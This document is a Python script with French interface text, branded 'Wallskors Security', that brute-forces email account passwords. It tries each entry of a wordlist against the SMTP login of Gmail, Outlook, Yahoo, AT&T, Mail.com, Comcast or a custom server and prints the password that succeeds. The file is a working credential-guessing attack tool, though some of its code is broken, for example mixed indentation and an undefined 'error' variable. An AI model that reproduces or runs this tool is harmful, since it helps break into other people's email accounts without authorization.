import smtplib
import os,sys
import time,random
import threading
import argparse

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

serv = None
port = 587

os.chdir('modules/')
parser = argparse.ArgumentParser(description="Framework Hunner")
parser.add_argument('login', help='Email de la cible')
parser.add_argument('password', help='Liste des mots de passe')
args = parser.parse_args()

if args.login or args.password:
	login = args.login
	password_list = args.password
	if os.path.exists(password_list):
		file = open(password_list,'r')
	else:
		print(F+'Le fichier n\'existe pas'+E)
        if os.path.exists("pas.txt"):
            file = open("pas.txt", 'r')
        else:
		    sys.exit(1)
def banner():
	text1 = '''
  ______ _____ _    _____ ___
  |  _  \  ___| |  |_   _/ _ \
  | | | | |__ | |    | |/ /_\ \
  | | | |  __|| |    | ||  _  |
  | |/ /| |___| |____| || | | |
  |___/ \____/\_____/\_/\_| |_/  Wallskors Security
	'''
	text2 = E + F + """
 ____  _____ ____  ____  _   _    _    _  _______
|  _ \| ____|  _ \/ ___|| \ | |  / \  | |/ | ____|
| |_) |  _| | | | \___ \|  \| | / _ \ | ' /|  _|
|  _ <| |___| |_| |___) | |\  |/ ___ \| . \| |___
|_| \_|_____|____/|____/|_| \_/_/   \_|_|\_|_____|
                  
""" + E
	if random.randrange(0,1) == 0:
		print(text1)
	else:
		print(text2)

def clear():
	os.system('clear')

def check_mail():
	global serv
	clear()
	banner()
	print(B+'Type de compte :'+E)
	print(H+"""
		1) Gmail
		2) Outlook
		3) Yahoo
		4) At&T
		5) Mail.com
		6) Comcast
		7) Saisir
		"""+E)
	ServerSmtp = input(W+'Wallskors»Mail»ServerSmtp»'+E)
	if int(ServerSmtp) == 1:
		serv = 'smtp.gmail.com'
		port = 587
	elif int(ServerSmtp) == 2:
		serv = 'smtp-mail.outlook.com'
		port = 587
	elif int(ServerSmtp) == 3:
		serv = 'smtp.mail.yahoo.com'
		port = 587
	elif int(ServerSmtp) == 4:
		serv = 'smtp.mail.att.net'
		port = 465
	elif int(ServerSmtp) == 5:
		serv = 'smtp.mail.com'
		port = 587
	elif int(ServerSmtp) == 6:
		serv = 'smtp.comcast.com'
		port = 587
	elif int(ServerSmtp) == 7:
		serv = input('Entrez le serveur smtp (Exemple:smtp.gmail.com)')
		port = input('Entrez le port du serveur smtp port (Defaut:587)')
	else:
		print('Erreur...')
		sys.exit(1)

def brut():
	print(F+'Attaque Bruteforce'+E)
	try:
		smtp = smtplib.SMTP(str(serv), int(port))
		smtp.ehlo()
		smtp.starttls()
	except:
		print(error)
	for line in file:
		try:
			passw = line.strip('\r\n')
			smtp.login(login, passw)
			print(W+time.ctime()+B+' Succès-> '+W+login+B+' Mot de passe-> '+W+passw)
			break
			sys.exit(1)
		except:
			print(F + time.ctime() + E + ' Echec->'+E+login+E+' Mot de passe->'+E+passw)

check_mail()
t1 = threading.Thread(target=brut)
t1.start()
